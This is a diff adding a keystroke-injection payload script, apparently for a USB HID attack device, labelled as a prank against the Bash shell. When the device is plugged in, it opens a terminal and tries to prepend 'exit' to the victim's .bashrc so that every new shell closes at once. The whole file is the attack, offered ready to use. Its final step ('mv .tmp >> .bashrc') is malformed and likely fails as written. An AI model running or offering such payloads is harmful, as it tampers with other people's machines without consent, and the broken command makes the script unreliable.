@@ -1,0 +1,28 @@
+############################################################
+#                                                          #
+# Title        : This damn shell doesn't work, SO SAD! :C  #
+# Author       : Aleff                                     #
+# Version      : 1.0                                       #
+# Category     : Prank                                     #
+# Target       : BASH Shell                                #
+#                                                          #
+############################################################
+
+ATTACKMODE HID
+
+# Requirements:
+#     - Nothing <3
+
+QUACK DELAY 1000
+QUACK CTRL-ALT t
+QUACK DELAY 2000
+QUACK STRING echo \"exit\" > .tmp
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING cat .bashrc >> .tmp
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING mv .tmp >> .bashrc
+QUACK ENTER
+QUACK DELAY 500
+QUACK ALT F4
